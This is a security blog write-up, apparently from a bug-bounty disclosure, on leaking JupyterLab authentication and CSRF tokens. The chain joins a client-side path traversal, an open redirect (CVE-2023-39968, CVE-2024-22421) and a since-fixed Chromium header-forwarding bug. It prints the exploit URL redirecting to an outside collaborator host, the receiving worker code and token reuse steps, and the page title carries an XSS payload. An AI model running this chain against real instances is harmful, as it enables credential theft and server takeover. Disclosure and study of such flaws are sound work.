<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Leaking Jupyter instance auth token chaining CVE-2023-39968, CVE-2024-22421 and a chromium bug - &#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;</title><meta name="Description" content="Cyber Insecurity blog"><meta property="og:title" content="Leaking Jupyter instance auth token chaining CVE-2023-39968, CVE-2024-22421 and a chromium bug" />
<meta property="og:description" content="After getting an invitation to Jupyter&rsquo;s private (then public and now not active anymore) program on Intigriti I decided to dig into its codebase. Spending a few hours I found a client side path traversal issue chaining which with an open redirect and a chromium issue, I was able to leak Jupyterlab&rsquo;s authentication and csrf tokens." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/" /><meta property="og:image" content="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/featured-image.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-30T01:00:00+04:00" />
<meta property="article:modified_time" content="2024-07-03T01:00:00+04:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/featured-image.png"/>
<meta name="twitter:title" content="Leaking Jupyter instance auth token chaining CVE-2023-39968, CVE-2024-22421 and a chromium bug"/>
<meta name="twitter:description" content="After getting an invitation to Jupyter&rsquo;s private (then public and now not active anymore) program on Intigriti I decided to dig into its codebase. Spending a few hours I found a client side path traversal issue chaining which with an open redirect and a chromium issue, I was able to leak Jupyterlab&rsquo;s authentication and csrf tokens."/>
<meta name="application-name" content="/blog.xss.am/">
<meta name="apple-mobile-web-app-title" content="/blog.xss.am/"><meta name="theme-color" content="#161209"><meta name="msapplication-TileColor" content="#161209"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png"><link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon.png"><link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#161209"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/" /><link rel="prev" href="https://blog.xss.am/2022/08/offzone-express-notes/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.276e0f03323c1a097f41bcf92a0e23bc16079b9e1aae801b101c8fb90aa496875892c3263fbd90b62de11a4f7df38d3d.css" integrity="sha384-J24PAzI8Ggl/Qbz5Kg4jvBYHm54aroAbEByPuQqklodYksMmP72Qti3hGk998409"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Leaking Jupyter instance auth token chaining CVE-2023-39968, CVE-2024-22421 and a chromium bug",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.xss.am\/2023\/08\/cve-2023-39968-jupyter-token-leak\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/blog.xss.am\/2023\/08\/cve-2023-39968-jupyter-token-leak\/featured-image.png",
                            "width":  1200 ,
                            "height":  600 
                        }],"genre": "posts","keywords": "open redirect, client side path traversal, chromium, python, javascript","wordcount":  931 ,
        "url": "https:\/\/blog.xss.am\/2023\/08\/cve-2023-39968-jupyter-token-leak\/","datePublished": "2023-08-30T01:00:00+04:00","dateModified": "2024-07-03T01:00:00+04:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "davwwwx","logo": "https:\/\/blog.xss.am\/images\/Boo.png"},"author": {
                "@type": "Person",
                "name": "Davwwwx"
            },"description": ""
    }
    </script></head>
    <body header-desktop="auto" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="&#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;"><span class="header-title-pre"><img src=x></span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="&#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;"><span class="header-title-pre"><img src=x></span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Leaking Jupyter instance auth token chaining CVE-2023-39968, CVE-2024-22421 and a chromium bug</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/about" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Davwwwx</a></span>&nbsp;<span class="post-category">included in <a href="/categories/cve/"><i class="far fa-folder fa-fw"></i>CVE</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="30-08-2023">30-08-2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;931 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2023/08/cve-2023-39968-jupyter-token-leak/featured-image.png"
        data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/featured-image.png, /2023/08/cve-2023-39968-jupyter-token-leak/featured-image.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/featured-image.png 2x"
        data-sizes="auto"
        alt="/2023/08/cve-2023-39968-jupyter-token-leak/featured-image.png"
        title="/2023/08/cve-2023-39968-jupyter-token-leak/featured-image.png" /></div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#client-side-path-traversal">Client side path traversal</a></li>
        <li><a href="#open-redirect">Open redirect</a></li>
        <li><a href="#leaking-the-authentication-and-csrf-tokens">Leaking the authentication and csrf tokens</a></li>
        <li><a href="#chromium-bug">Chromium bug</a></li>
        <li><a href="#closing-words-and-tooling">Closing words and tooling</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>After getting an invitation to <a href="https://app.intigriti.com/researcher/programs/jupyter/jupyter/detail" target="_blank" rel="noopener noreffer">Jupyter</a>&rsquo;s private (then public and now not active anymore) program on <a href="https://www.intigriti.com/" target="_blank" rel="noopener noreffer">Intigriti</a> I decided to dig into its codebase. Spending a few hours I found a client side path traversal issue chaining which with an open redirect and a chromium issue, I was able to leak Jupyterlab&rsquo;s authentication and csrf tokens.</p>
<h3 id="client-side-path-traversal">Client side path traversal</h3>
<p>To find a client side path traversal I usually go one of these ways: blackboxy, i.e. spraying <code>../../../traversed</code> in all the query string or fragment parameters, or whiteboxy, i.e. manually looking for fetch/xhr sinks in javascript code. In this case, I started with spraying, then finding out the root cause of the issue.<br>
Reading the docs, I found <a href="https://jupyterlab.readthedocs.io/en/latest/user/urls.html#cloning-workspaces" target="_blank" rel="noopener noreffer"><code>clone</code></a> parameter which would, as the name suggests, clone a workspace. I navigated to <a href="http://localhost:8888/lab?clone=anything" target="_blank" rel="noopener noreffer">http://localhost:8888/lab?clone=anything</a> (localhost:8888 is a jupyterlab local instance) and saw the reflection in the api request path.</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/path-reflection.png" title="path reflection" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/path-reflection.png" data-sub-html="<h2>path reflection</h2><p>path reflection</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="path-reflection.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/path-reflection.png, path-reflection.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/path-reflection.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/path-reflection.png" />
    </a><figcaption class="image-caption">path reflection</figcaption>
    </figure></p>
<p>Then I tried to go back a few levels by opening the following URL <a href="http://localhost:8888/lab?clone=../../../traversed" target="_blank" rel="noopener noreffer">http://localhost:8888/lab?clone=../../../traversed</a>, and to my surprise, it worked, the app traversed back from the <code>workspaces</code> api endpoint to <code>/traversed</code></p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/traversed.png" title="client side path traversal" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/traversed.png" data-sub-html="<h2>client side path traversal</h2><p>client side path traversal</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="traversed.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/traversed.png, traversed.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/traversed.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/traversed.png" />
    </a><figcaption class="image-caption">client side path traversal</figcaption>
    </figure></p>
<p>But why would this work? To understand it we should start with the source, i.e. where the app starts processing <code>clone</code> query parameter, and see how it reaches the request sink. The source is located on line 439 at <a href="https://github.com/jupyterlab/jupyterlab/blob/97f1c6f957f272113dce8157318d74c4fb23c289/packages/apputils-extension/src/index.ts#L438-L453" target="_blank" rel="noopener noreffer">packages/apputils-extension/src/index.ts</a> and is being passed to <code>workspaces.fetch</code> on line 453.</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/clone-source.png" title="clone parameter source" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/clone-source.png" data-sub-html="<h2>clone parameter source</h2><p>clone parameter source</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="clone-source.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/clone-source.png, clone-source.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/clone-source.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/clone-source.png" />
    </a><figcaption class="image-caption">clone parameter source</figcaption>
    </figure></p>
<p>Then <code>workspaces.fetch</code> passes it to <code>makeRequest</code> at <a href="https://github.com/jupyterlab/jupyterlab/blob/97f1c6f957f272113dce8157318d74c4fb23c289/packages/services/src/workspace/index.ts#L48" target="_blank" rel="noopener noreffer">packages/services/src/workspace/index.ts</a> on line 48, after joining the path unsafely (<code>id</code>, i.e. malicious path via delivered via <code>clone</code> query parameter, being appended to the initial path) with URLExt.join (<a href="https://github.com/jupyterlab/jupyterlab/blob/97f1c6f957f272113dce8157318d74c4fb23c289/packages/coreutils/src/url.ts#L55" target="_blank" rel="noopener noreffer">packages/coreutils/src/url.ts</a>).</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/workspaces-fetch.png" title="workspaces.fetch" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/workspaces-fetch.png" data-sub-html="<h2>workspaces.fetch</h2><p>workspaces.fetch</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="workspaces-fetch.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/workspaces-fetch.png, workspaces-fetch.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/workspaces-fetch.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/workspaces-fetch.png" />
    </a><figcaption class="image-caption">workspaces.fetch</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/private-url.png" title="Private.url" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/private-url.png" data-sub-html="<h2>Private.url</h2><p>Private.url</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="private-url.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/private-url.png, private-url.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/private-url.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/private-url.png" />
    </a><figcaption class="image-caption">Private.url</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/urlext-join.png" title="URLExt.join" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/urlext-join.png" data-sub-html="<h2>URLExt.join</h2><p>URLExt.join</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="urlext-join.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/urlext-join.png, urlext-join.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/urlext-join.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/urlext-join.png" />
    </a><figcaption class="image-caption">URLExt.join</figcaption>
    </figure></p>
<p>And makeRequest (handleRequest) appends authorization and csrf headers at <a href="https://github.com/jupyterlab/jupyterlab/blob/97f1c6f957f272113dce8157318d74c4fb23c289/packages/services/src/serverconnection.ts#L283-L293" target="_blank" rel="noopener noreffer">packages/services/src/serverconnection.ts</a> on lines 283-293</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/makeRequest.png" title="makeRequest" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/makeRequest.png" data-sub-html="<h2>makeRequest</h2><p>makeRequest</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="makeRequest.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/makeRequest.png, makeRequest.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/makeRequest.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/makeRequest.png" />
    </a><figcaption class="image-caption">makeRequest</figcaption>
    </figure>
<figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/handleRequest.png" title="handleRequest" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/handleRequest.png" data-sub-html="<h2>handleRequest</h2><p>handleRequest</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="handleRequest.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/handleRequest.png, handleRequest.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/handleRequest.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/handleRequest.png" />
    </a><figcaption class="image-caption">handleRequest</figcaption>
    </figure></p>
<h3 id="open-redirect">Open redirect</h3>
<p>Now was the time I started looking for an open redirect or other ways I could store and serve my content to <code>workspaces.fetch</code> request.
Opening <a href="http://localhost:8888/login?next=%2Flab" target="_blank" rel="noopener noreffer">http://localhost:8888/lab</a> in an unauthenticated browser session I noticed I was redirected to <a href="http://localhost:8888/login?next=%2Flab" target="_blank" rel="noopener noreffer">http://localhost:8888/login?next=%2Flab</a>, so I went into <a href="https://github.com/jupyter-server/jupyter_server" target="_blank" rel="noopener noreffer">jupyter_server</a> codebase to find out if <code>next</code> parameter was checking the redirect uri properly.</p>
<p>Searching for <code>next</code> led me to <a href="https://github.com/jupyter-server/jupyter_server/blob/cd8010e2335de29e6f9d7b98cd496b0695bc0ed3/jupyter_server/auth/login.py#L67" target="_blank" rel="noopener noreffer">jupyter_server/auth/login.py</a>, which was passing it to <code>_redirect_safe</code> on line 67.</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/login-handler.png" title="login handler" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/login-handler.png" data-sub-html="<h2>login handler</h2><p>login handler</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="login-handler.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/login-handler.png, login-handler.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/login-handler.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/login-handler.png" />
    </a><figcaption class="image-caption">login handler</figcaption>
    </figure></p>
<p>On line 45 it is stated that if the parsed uri does not have a <code>netloc</code>, <code>next</code> query param will be used to redirect as is (line 61) <a href="https://github.com/jupyter-server/jupyter_server/blob/cd8010e2335de29e6f9d7b98cd496b0695bc0ed3/jupyter_server/auth/login.py#L45" target="_blank" rel="noopener noreffer">jupyter_server/auth/login.py</a></p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/netloc-issue.png" title="netloc issue" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/netloc-issue.png" data-sub-html="<h2>netloc issue</h2><p>netloc issue</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="netloc-issue.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/netloc-issue.png, netloc-issue.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/netloc-issue.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/netloc-issue.png" />
    </a><figcaption class="image-caption">netloc issue</figcaption>
    </figure></p>
<p>This check was possible to bypass with a url like the following - https:///evil.com (it won&rsquo;t have a netloc)</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/python-urlparse-issue.png" title="python url parsing issue" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/python-urlparse-issue.png" data-sub-html="<h2>python url parsing issue</h2><p>python url parsing issue</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="python-urlparse-issue.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/python-urlparse-issue.png, python-urlparse-issue.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/python-urlparse-issue.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/python-urlparse-issue.png" />
    </a><figcaption class="image-caption">python url parsing issue</figcaption>
    </figure></p>
<p>So the following URL - <a href="http://localhost:8888/login?next=https:///evil.com" target="_blank" rel="noopener noreffer">http://localhost:8888/login?next=https:///evil.com</a>, will successfully redirect an authenticated client to <a href="https://evil.com" target="_blank" rel="noopener noreffer">https://evil.com</a></p>
<h3 id="leaking-the-authentication-and-csrf-tokens">Leaking the authentication and csrf tokens</h3>
<p>To test the issue I tried redirecting to a burp collaborator instance and see if the client would make a request to it after being redirected with the following url</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://localhost:8888/lab?clone=../../../login%3fnext%3dhttps%3a%2f%2f%2fmyid.oastify.com
</code></pre></td></tr></table>
</div>
</div><p>Oastify, being not the same origin, triggered CORS process requiring the server to allow the following headers.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="err">Access-Control-Request-Headers: authorization,content-type,x-xsrftoken
</span></code></pre></td></tr></table>
</div>
</div><p>So I created a cloudflare worker with the following code</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">headers</span> <span class="o">=</span> <span class="p">{</span> 
    <span class="s2">&#34;Content-Type&#34;</span><span class="o">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
    <span class="s2">&#34;Access-Control-Allow-Origin&#34;</span><span class="o">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
    <span class="s2">&#34;Access-Control-Allow-Headers&#34;</span><span class="o">:</span> <span class="s2">&#34;authorization,content-type,x-xsrftoken&#34;</span>
<span class="p">}</span>
<span class="kr">const</span> <span class="nx">fileBr</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="kr">async</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">env</span><span class="p">,</span> <span class="nx">ctx</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">Response</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">fileBr</span><span class="p">),{</span><span class="nx">headers</span><span class="p">});</span>
  <span class="p">},</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>The weirdest part was that the custom set headers were also being forwarded to my origin even after being redirected.</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/leak-credentials.png" title="leaking credentials" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/leak-credentials.png" data-sub-html="<h2>leaking credentials</h2><p>leaking credentials</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="leak-credentials.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/leak-credentials.png, leak-credentials.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/leak-credentials.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/leak-credentials.png" />
    </a><figcaption class="image-caption">leaking credentials</figcaption>
    </figure></p>
<p>These credentials can then be used to get access to the server simply by navigating to <code>http://localhost:8888/lab?token=&lt;leaked-token&gt;</code>.</p>
<h3 id="chromium-bug">Chromium bug</h3>
<p>At first, I thought it was an issue in <a href="https://www.npmjs.com/package/follow-redirects" target="_blank" rel="noopener noreffer">follow-redirects</a> package, as it had a similar vulnerability <a href="https://security.snyk.io/vuln/SNYK-JS-FOLLOWREDIRECTS-2332181" target="_blank" rel="noopener noreffer">https://security.snyk.io/vuln/SNYK-JS-FOLLOWREDIRECTS-2332181</a> and jupyterlab had the vulnerable version. So I left it as is without taking a proper look into it.</p>
<p>After about a month I encountered the same issue on another program. This time it was passed into fetch API directly (not into a wrapper).</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/fetchapi.png" title="fetch api sink" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/fetchapi.png" data-sub-html="<h2>fetch api sink</h2><p>fetch api sink</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="fetchapi.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/fetchapi.png, fetchapi.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/fetchapi.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/fetchapi.png" />
    </a><figcaption class="image-caption">fetch api sink</figcaption>
    </figure></p>
<p>Just to be sure ðŸ˜…, I have created a similar poc at <a href="https://chromium-poc-53c4.xssam.workers.dev/?id=../../redirect/?url=https://chromium-poc-cors-dd35.xssam.workers.dev/" target="_blank" rel="noopener noreffer">https://chromium-poc-53c4.xssam.workers.dev/?id=../../redirect/?url=https://chromium-poc-cors-dd35.xssam.workers.dev/</a> AND IT WORKED !!.</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/chromium-leak.png" title="chromium leak" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/chromium-leak.png" data-sub-html="<h2>chromium leak</h2><p>chromium leak</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="chromium-leak.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/chromium-leak.png, chromium-leak.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/chromium-leak.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/chromium-leak.png" />
    </a><figcaption class="image-caption">chromium leak</figcaption>
    </figure></p>
<p>I have previously seen similar behavior on mobile apps, but chromium doing the same, was something unexpected. So I just created a ticket in the chromium bug tracker and got a quick response that it was a duplicate of a closed issue.</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/duplicate.png" title="duplicate" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/duplicate.png" data-sub-html="<h2>duplicate issue</h2><p>duplicate</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="duplicate.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/duplicate.png, duplicate.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/duplicate.png 2x"
            data-sizes="auto"
            alt="/2023/08/cve-2023-39968-jupyter-token-leak/duplicate.png" />
    </a><figcaption class="image-caption">duplicate issue</figcaption>
    </figure></p>
<p>This has since been fixed, and chromium does not forward custom set headers on redirect anymore.</p>
<h3 id="closing-words-and-tooling">Closing words and tooling</h3>
<p>Client side path traversal vulnerabilities are quite common in single-page applications and it is always worth looking for them. Although the chromium bug is now patched, CSPT issues still have a big potential to get turned into CSRF, XSS or info leaks.</p>
<p>I have been encountering similar issues pretty often, so to ease the process of finding path traversals, I have developed (shamelessly copied from various places) a chromium extension that will log the xhr/fetch reflected parameters in a popup <a href="https://github.com/davwwwx/Reflection-Logger" target="_blank" rel="noopener noreffer">https://github.com/davwwwx/Reflection-Logger</a>.</p>
<p><figure><a class="lightgallery" href="/2023/08/cve-2023-39968-jupyter-token-leak/reflection-logger.png" title="reflection logger extension" data-thumbnail="/2023/08/cve-2023-39968-jupyter-token-leak/reflection-logger.png" data-sub-html="<h2>reflection logger extension</h2><p>reflection logger extension</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="reflection-logger.png"
            data-srcset="/2023/08/cve-2023-39968-jupyter-token-leak/reflection-logger.png, reflection-logger.png 1.5x, /2023/08/cve-2023-39968-jupyter-token-leak/reflection-logger.png 2x"
            data-sizes="auto"
